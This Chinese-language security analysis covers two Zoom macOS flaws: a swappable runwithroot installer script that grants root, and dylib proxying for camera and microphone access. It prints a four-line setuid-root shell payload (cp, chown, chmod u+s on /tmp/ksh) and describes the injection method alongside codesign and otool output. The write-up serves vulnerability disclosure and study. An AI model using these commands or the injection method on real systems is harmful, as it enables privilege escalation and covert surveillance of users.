### 优化后的文本

#### 进程信息
```json
{
  "ppid": 1876,
  "ancestors": [1876, 1823, 1820, 1],
  "signing_info": {
    "csFlags": 603996161,
    "signatureIdentifier": "com.apple.sh",
    "cdHash": "D3308664AA7E12DF271DC78A7AE61F27ADA63BD6",
    "isPlatformBinary": 1
  },
  "path": "/bin/sh",
  "pid": 1882
}
```
**时间戳**: 2020-03-31 03:18:45 +0000

### 安全漏洞分析

**问题描述**: 
本地无特权的攻击者（或恶意软件）是否可以在以root用户身份执行`runwithroot`脚本之前修改该脚本？需要注意的是，`AuthorizationExecuteWithPrivileges` API不会验证正在执行的内容。

**答案**: 是的，可以修改。

**确认依据**:
在macOS安装过程中，安装程序会将`runwithroot`脚本复制到用户可写的临时目录中。例如：

```bash
tester@users-Mac T % pwd
/private/var/folders/v5/s530008n11dbm2n2pgzxkk700000gp/T
tester@users-Mac T % ls -lart com.apple.install.v43Mcm4r
total 27224
-rwxr-xr-x   1 tester  staff     70896 Mar 23 02:25 zoomAutenticationTool
-rw-r--r--   1 tester  staff       513 Mar 23 02:25 zoom.entitlements
-rw-r--r--   1 tester  staff  12008512 Mar 23 02 :25 zm.7z
-rwxr-xr-x   1 tester  staff       448 Mar 23 02:25 runwithroot
...
```

这表明攻击者可以在安装或升级期间替换或修改`runwithroot`脚本来获取root权限。例如，可以通过向`runwithroot`脚本中添加以下命令来弹出一个root shell：

```bash
1 cp /bin/ksh /tmp
2 chown root:wheel /tmp/ksh
3 chmod u+s /tmp/ksh
4 open /tmp/ksh
```

### Zoom本地安全漏洞 #2：麦克风与摄像头权限的代码注入

**背景**:
Zoom需要系统麦克风和摄像头的权限，并且在最新版本的macOS上，这种权限的申请需要明确的用户批准。然而，Zoom存在一个特殊的“排除项”，允许攻击者将恶意代码注入其进程空间中，从而获得麦克风和摄像头的访问权限。

**现代macOS的安全特性**:
现代macOS程序在编译过程中引入了`Hardened Runtime`特性，它与系统完整性保护（SIP）一起，通过防止代码注入、动态链接库劫持和进程内存空间篡改等漏洞来保护软件运行时的完整性。

**检查Zoom的签名**:
我们可以通过`codesign`工具检查Zoom是否已使用`Hardened Runtime`进行有效签名和编译：

```bash
$ codesign -dvvv /Applications/zoom.us.app/
Executable=/Applications/zoom.us.app/Contents/MacOS/zoom.us
Identifier=us.zoom.xos
Format=app bundle with Mach-O thin (x86_64)
CodeDirectory v=20500 size=663 flags=0x10000(runtime) hashes=12+5 location=embedded
...
Authority=Developer ID Application: Zoom Video Communications, Inc. (BJ4HAAB9B3)
Authority=Developer ID Certification Authority
Authority=Apple Root CA
```

`flags`值为`0x10000`（runtime）表示应用程序是使用`Hardened Runtime`选项编译的。

**问题发现**:
通过`codesign`工具查看Zoom的entitlements：

```bash
$ codesign -d --entitlements :- /Applications/zoom.us.app/
Executable=/Applications/zoom.us.app/Contents/MacOS/zoom.us
  com.apple.security.automation.apple-events
  com.apple.security.device.audio-input
  com.apple.security.device.camera
  com.apple.security.cs.disable-library-validation
  com.apple.security.cs.disable-executable-page-protection
```

`com.apple.security.cs.disable-library-validation`这一entitlement允许任何库加载到Zoom的地址空间中，从而使得代码注入成为可能。

**利用方法**:
一种常见的方法是`dylib proxying`，即替换目标依赖的合法库文件，并将所有请求代理回原始库文件。这种方法既隐蔽又持久，深受恶意软件作者喜爱。

**确定Zoom的依赖库**:
通过`otool`工具查看Zoom在运行时链接的库：

```bash
$ otool -L /Applications/zoom.us.app/Contents/MacOS/zoom.us 
/Applications/zoom.us.app/Contents/MacOS/zoom.us:
  @rpath/curl64.framework/Versions/A/curl64
  /System/Library/Frameworks/Cocoa.framework/Versions/A/Cocoa
  /System/Library/Frameworks/Foundation.framework/Versions/C/Foundation
  /usr/lib/libobjc.A.dylib
  /usr/lib/libc++.1.dylib
  /usr/lib/libSystem.B.dylib
  /System/Library/Frameworks/AppKit.framework/Versions/C/AppKit
  /System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation
```

通过代理这些库中的一个，攻击者可以将恶意代码注入到Zoom的进程中，从而绕过`Hardened Runtime`并获得麦克风和摄像头的访问权限。